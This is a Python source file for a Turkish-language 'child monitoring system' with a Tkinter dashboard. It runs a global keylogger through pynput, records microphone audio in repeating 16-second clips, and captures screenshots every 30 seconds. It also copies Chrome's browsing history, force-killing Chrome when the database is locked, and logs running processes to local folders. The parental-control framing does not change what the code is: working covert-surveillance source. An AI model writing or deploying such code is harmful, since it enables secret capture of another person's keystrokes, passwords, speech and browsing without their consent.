
##############################################################################
#
#
# Copyright (c) 2019 Uğur ILGIN <ugurilgin94@gmail.com>
# All rights reserved.
# Licensed under the GNU GENERAL PUBLIC LICENSE v3.0
# (https://choosealicense.com/licenses/gpl-3.0/)
#
# 
##############################################################################


from tkinter import *
import sqlite3
import re
import os
import getpass
import subprocess
from pynput.keyboard import Key,Listener
import autopy
import random
import threading
import time
import pyaudio
import wave
import locale
from datetime import datetime
global deger
global timebreak
global zamansabiti
timebreak=True

def recordAudio():
    global zamansabiti
    FORMAT = pyaudio.paInt16
    CHANNELS = 2
    RATE = 44100
    CHUNK = 1024
    RECORD_SECONDS = 16
    a=datetime.now()
    b=str(a)
    c=b.split('.')
    d=c[0].split(":")
    bugun=datetime.strftime(a,'%d %B %Y')
    if not os.path.exists('Audio/'+bugun):
        os.makedirs('Audio/'+bugun)
    WAVE_OUTPUT_FILENAME = "Audio/"+bugun+"/"+d[0]+d[1]+d[2]+".wav"
    print(a)
    audio = pyaudio.PyAudio()
 
# start Recording
    stream = audio.open(format=FORMAT, channels=CHANNELS,rate=RATE, input=True,frames_per_buffer=CHUNK)
    print ("recording...")
    frames = []
 
    for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
        data = stream.read(CHUNK)
        frames.append(data)
    print ("finished recording")
 
 
# stop Recording
    stream.stop_stream()
    stream.close()
    audio.terminate()
 
    waveFile = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
    waveFile.setnchannels(CHANNELS)
    waveFile.setsampwidth(audio.get_sample_size(FORMAT))
    waveFile.setframerate(RATE)
    waveFile.writeframes(b''.join(frames))
    waveFile.close()
def baslangicHistory():
    a=datetime.now()
    bugun=datetime.strftime(a,'%d %B %Y')
    if not os.path.exists('WebHistory/'+bugun+'/WebHistory.txt'):
        try:
            conn = sqlite3.connect('c://Users//'+getpass.getuser()+'//AppData//Local//Google//Chrome//User Data//Default//History',timeout=10)
            c = conn.cursor()
            c.execute("SELECT * FROM urls")
            rows = c.fetchall()
        
            dosya=open("WebHistory/"+bugun+"/WebHistory.txt","w",encoding='utf-8')
            for row in rows:
                dosya.write(row[2]+"\n")
                conn.commit()        
            dosya.close()
            conn.close()
            
        except:
            os.system("TASKKILL /F /IM chrome.exe") 
            time.sleep(1)  
            conn = sqlite3.connect('c://Users//'+getpass.getuser()+'//AppData//Local//Google//Chrome//User Data//Default//History',timeout=10)
            c = conn.cursor()
            c.execute("SELECT * FROM urls")
            rows = c.fetchall()
            if not os.path.exists('WebHistory/'+bugun):
                os.makedirs('WebHistory/'+bugun)
            dosya=open("WebHistory/"+bugun+"/WebHistory.txt","w",encoding='utf-8')
            for row in rows:
                dosya.write(row[2]+"\n")
                conn.commit()        
            dosya.close()
            conn.close()     
  
def bulHistory():
    try:
        a=datetime.now()
        bugun=datetime.strftime(a,'%d %B %Y')
        if not os.path.exists('WebHistory/'+bugun):
            os.makedirs('WebHistory/'+bugun)
        conn = sqlite3.connect('c://Users//'+getpass.getuser()+'//AppData//Local//Google//Chrome//User Data//Default//History',timeout=10)
        c = conn.cursor()
        c.execute("SELECT * FROM urls")
        rows = c.fetchall()
        dosya=open("WebHistory/"+bugun+"/YeniWebHistory.txt","w",encoding='utf-8')
        for row in rows:
            dosya.write(row[2]+"\n")
            conn.commit()        
        dosya.close()
        conn.close()
        dosya=open("WebHistory/"+bugun+"/WebHistory.txt","r",encoding='utf-8')
        dizi=[]
        dizi=dosya.readlines()
        dosya.close()
        idosya=open("WebHistory/"+bugun+"/YeniWebHistory.txt","r",encoding='utf-8')
        dizim=[]
        dizim=idosya.readlines()
        idosya.close()
        yenidizi=[]
        for j in dizim:
            if( j not in dizi):
                yenidizi.append(j+"\n")
        a=datetime.now()
        bugun=datetime.strftime(a,'%d %B %Y')
        if not os.path.exists('WebHistory/'+bugun):
            os.makedirs('WebHistory/'+bugun)
        for i in yenidizi:
            dosya=open("WebHistory/"+bugun+"/HistoryList.txt", "a")
            dosya.write(i)
            dosya.close()  
            
    except:
        a=datetime.now()
        bugun=datetime.strftime(a,'%d %B %Y')
        if not os.path.exists('WebHistory/'+bugun):
            os.makedirs('WebHistory/'+bugun)
        os.system("TASKKILL /F /IM chrome.exe")
        time.sleep(1)
        c = conn.cursor()
        c.execute("SELECT * FROM urls")
        rows = c.fetchall()
        dosya=open("WebHistory/"+bugun+"/YeniWebHistory.txt","w",encoding='utf-8')
        for row in rows:
            dosya.write(row[2]+"\n")
            conn.commit()        
        dosya.close()
        conn.close()
        dosya=open("WebHistory/"+bugun+"/WebHistory.txt","r",encoding='utf-8')
        dizi=[]
        dizi=dosya.readlines()
        dosya.close()
        idosya=open("WebHistory/"+bugun+"/YeniWebHistory.txt","r",encoding='utf-8')
        dizim=[]
        dizim=idosya.readlines()
        idosya.close()
        yenidizi=[]
        for j in dizim:
            if( j not in dizi):
                yenidizi.append(j+"\n")
        a=datetime.now()
        bugun=datetime.strftime(a,'%d %B %Y')
        if not os.path.exists('WebHistory/'+bugun):
            os.makedirs('WebHistory/'+bugun)
        for i in yenidizi:
            dosya=open("WebHistory/"+bugun+"/HistoryList.txt", "a")
            dosya.write(i)
            dosya.close()  
        
def imageViewer():
    
    form=Tk()
    
    form.title("İmage Viewer")
    form.geometry('1920x800')
    form.configure(background='#050238')
    fato=PhotoImage(file="img/avatar.png")
    view =Label (form,image=fato)
    view.place(x=0,y=80,width=169,height=169)
    a=datetime.now()
    bugun=datetime.strftime(a,'%d %B %Y')
   
    form.mainloop()    
def browserHistory():
    form=Tk()
    form.title("Web History")
    form.geometry('1920x800')
    form.configure(background='#050238')
    liste=Listbox(form,height=37,width=80,bg="#050238",fg="#f2eaea",bd=0,highlightthickness=0)
    #urlliste=Listbox(form,height=37,width=870,bg="#050238",fg="#f2eaea",bd=0,highlightthickness=0)
    #urlliste.place(x=487,y=50)
    liste.place(x=0,y=50)
    a=datetime.now()
    bugun=datetime.strftime(a,'%d %B %Y')
    dosya=open("WebHistory/"+bugun+"/HistoryList.txt", "r")
    dizi=[]
    dizi=dosya.readlines()
    dosya.close()
    for row in dizi:
        liste.insert("end", row)       
    form.mainloop()
   
    
def uygBul():
    
    x = subprocess.Popen("tasklist", stdout=subprocess.PIPE, shell=True)
    output =x.stdout.read()
    dosyam=open("Uygulama/appslar.txt", "w")
    a=output
    dosyam.write(a.decode('utf-8'))
    dosyam.close()
    dosya=open("Uygulama/apps.txt", "r")
    dizi=[]
    dizi=dosya.readlines()
    dosya.close()
    ikinci=open("Uygulama/appslar.txt", "r")
    dizim=[]
    dizim=ikinci.readlines()
    ikinci.close()
    gecicidizi=[]
    for i in dizim:
        a=i.split(".")
    
        gecicidizi.append(a[0])
    yenigecicidizi=[]
    for i in dizi:
        a=i.split(".")
        yenigecicidizi.append(a[0])
        
    yenidizi=[]
    
    for j in gecicidizi :
        if( j not in yenigecicidizi):
            yenidizi.append(j+"\n")
   
   
    a=datetime.now()
    bugun=datetime.strftime(a,'%d %B %Y')
    if not os.path.exists('Uygulama/'+bugun):
        os.makedirs('Uygulama/'+bugun)
    for i in yenidizi:
        if(("System" in i) or ("Registry" in i)or("Memory Compression" in i) ):
            print(i)   
        else:
           
            dosya=open("Uygulama/"+bugun+"/appsOpen.txt", "a")
            dosya.write(i)
            dosya.close()
 
def screenSaver():
    a=datetime.now()
    b=str(a)
    c=b.split('.')
    d=c[0].split(":")
    bugun=datetime.strftime(a,'%d %B %Y')
    if not os.path.exists('Screen/'+bugun):
        os.makedirs('Screen/'+bugun)
    a=random.randint(1,1000000000000000000000000)
    bitmap=autopy.bitmap.capture_screen()
    bitmap.save('Screen/'+bugun+'/'+d[0]+d[1]+d[2]+'.png')
    
    
def baslangicUyg():
    x = subprocess.Popen("tasklist", stdout=subprocess.PIPE, shell=True)
    output =x.stdout.read()
    dosya=open("Uygulama/apps.txt", "w")
    a=output
    dosya.write(a.decode('utf-8'))
    dosya.close()     
def taskList():
    form=Tk()
    form.title("Uygulama İzle")
    form.geometry('1920x800')
    form.configure(background='#050238')
    textBox=Text(form,bg="#050238",fg="#ffffff",height=37,width=50)
    textBox.place(x=50,y=50)
    a=datetime.now()
    bugun=datetime.strftime(a,'%d %B %Y')
    dosya=open("Uygulama/"+bugun+"/"+"appsOpen.txt", "r")
    a=dosya.read()
    textBox.insert("end",a)
    dosya.close()
    form.mainloop()
def Keylogger():
    a=datetime.now()
    b=str(a)
    c=b.split('.')
    d=c[0].split(":")
    bugun=datetime.strftime(a,'%d %B %Y')
    dosya=open("online.txt","w")
    dosya.write("1")
    dosya.close()
    dosya=open("Keylogger/"+bugun+"/"+d[0]+d[1]+d[2]+".txt","r")
    form=Tk()
    form.title("Keylogger")
    form.geometry('1920x800')
    form.configure(background='#050238')
    textBox=Text(form,bg="#050238",fg="#ffffff",height=37,width=50)
    textBox.place(x=50,y=50)
    textBox.insert("end",dosya.read())
    dosya.close()
    form.mainloop()
def stopTheWorld():
    global timebreak
    timebreak=False
    dosya=open("online.txt","w")
    dosya.write("0")
    dosya.close()
def AnaMenu():
    dosya=open("online.txt","w")
    dosya.write("1")
    dosya.close()
    window = Tk()

    w, h = window.winfo_screenwidth(), window.winfo_screenheight()
    window.geometry("%dx%d+0+0" % (w, h))
    window.title("Çocuk Takip Sistemi")
    window.configure(background='#050238')

    foto=PhotoImage(file="img/web.png")
    webcam=PhotoImage(file="img/webcam.png")
    screen=PhotoImage(file="img/screen.png")
    key=PhotoImage(file="img/key.png")
    setting=PhotoImage(file="img/setting.png")
    video=PhotoImage(file="img/video.png")
    uyg=PhotoImage(file="img/uyg.png")
    ses=PhotoImage(file="img/ses.png")
    avatar=PhotoImage(file="img/avatar.png")
    play=PhotoImage(file="img/play.png")
    stop=PhotoImage(file="img/stopper.png")


    sitebut=Button(window,text="Ziyaret Edilen Websiteleri",image=foto,bd=0,highlightthickness=0,command=browserHistory,width=169,height=162,bg="#F4192B",fg="#000000")
    sitebut.place(x=80,y=80)

    Webcam=Button(window,text="WebCam Kaydedici",command=browserHistory,image=webcam,bd=0,highlightthickness=0,width=169,height=162,bg="#002fa7",fg="#000000")
    Webcam.place(x=300,y=80)

    ekranBut=Button(window,text="Ekran Kaydedici",image=screen,bd=0,highlightthickness=0,command=imageViewer,width=168,height=162,bg="#ff7f00",fg="#000000")
    ekranBut.place(x=520,y=80)

    keyloggerBut=Button(window,text="Keylogger",image=key,bd=0,highlightthickness=0,command=Keylogger,width=168,height=162,bg="#00FF00",fg="#000000")
    keyloggerBut.place(x=740,y=80)

    ayarBut=Button(window,text="Ayarlar",image=setting,bd=0,highlightthickness=0,command=browserHistory,width=168,height=162,bg="#ffffff",fg="#000000")
    ayarBut.place(x=80,y=350)

    videoOynatBut=Button(window,text="Video Oynatıcı",image=video,bd=0,highlightthickness=0,command=browserHistory,width=168,height=162,bg="#660099",fg="#000000")
    videoOynatBut.place(x=300,y=350)

    uygulamaBut=Button(window,text="Uygulamaları İzle",image=uyg,bd=0,highlightthickness=0,command=taskList,width=168,height=162,bg="#ff00ff",fg="#000000")
    uygulamaBut.place(x=520,y=350)

    sesBut=Button(window,text="Ses",image=ses,bd=0,highlightthickness=0,command=browserHistory,width=168,height=162,bg="#FFFF00",fg="#000000")
    sesBut.place(x=740,y=350)

    playBut=Button(window,image=play,bd=0,highlightthickness=0,command=taskList,width=85,height=81,bg="#ff00ff",fg="#000000")
    playBut.place(x=1080,y=500)

    stopBut=Button(window,image=stop,bd=0,highlightthickness=0,command=stopTheWorld,width=85,height=81,bg="#FFFF00",fg="#000000")
    stopBut.place(x=1180,y=500)


    view =Label (window,image=avatar)
    view.place(x=1080,y=80,width=169,height=169)

    hello =Label (window,text="Hoşgeldiniz, User",bg="#050238",fg="#ffffff")
    hello.place(x=1080,y=300)

    mesaj =Label (window,text="\n Bu programı kullanarak siz evde yokken çocuğunuz \n bilgisayar başında neler yapıyor öğrenebilirsiniz.\n Tek yapmanız gereken ilgili buttonlara tıklamaktır.",bg="#050238",fg="#ffffff")
    mesaj.place(x=1050,y=370)

        
    window.mainloop()
def zamanlayiciFonk():
    x=0
    
    while(timebreak):
        if(x%10==0):
            uygBul()
        if(x%300==0):
            bulHistory()   
        if(x%30==0):
            screenSaver()
            
        print(x)
        x=x+1
        time.sleep(1)
def zamanlayiciAudio():
     global zamansabiti
     zamansabiti=0
     while(timebreak):
        recordAudio()
        print("Audio:"+str(zamansabiti))
        zamansabiti=zamansabiti+1
        time.sleep(1)
def Keyloggerim():
    global deger
    deger=True
    def on_press(key):
        a=datetime.now()
        bugun=datetime.strftime(a,'%d %B %Y')
        if not os.path.exists('Keylogger/'+bugun):
            os.makedirs('Keylogger/'+bugun)
        print(key)
        dosya=open("Keylogger/"+bugun+"/"+"kaydedilenmetin.txt","a")
        if(key==Key.space):
            dosya.write(" ")
        elif(key==Key.enter):
            dosya.write("\n")
        elif(key==Key.shift):
            dosya.write("<Shif>")
        elif(key==Key.caps_lock):
            dosya.write("<CapsLock>")
        elif(key==Key.backspace):
            dosya.write("<delete>")
        elif(key==Key.tab):
            dosya.write("\t")
        elif(key==Key.ctrl):
            dosya.write(" Ctrl+")
        elif(key==Key.ctrl_l):
            dosya.write(" Ctrl+")
        else:
            a=str(key).split("'")
            try:
                dosya.write(a[1])
            except:
                dosya.write(str(key))
        dosya.close
    def on_release(key):
        dosya=open("online.txt","r")
        a=dosya.read()
        dosya.close()
        if(a=="0"):
            return False
    with Listener(on_press=on_press,on_release=on_release) as listener:
        listener.join()


#MultiThreading 
baslangicUyg()
baslangicHistory()
menuThread = threading.Thread(target=AnaMenu)
keyloggerThread = threading.Thread(target=Keyloggerim)
zamanlayiciThread = threading.Thread(target=zamanlayiciFonk)
sesKaydediciThread = threading.Thread(target=zamanlayiciAudio)
sesKaydediciThread.start()
zamanlayiciThread.start()
menuThread.start()
keyloggerThread.start()
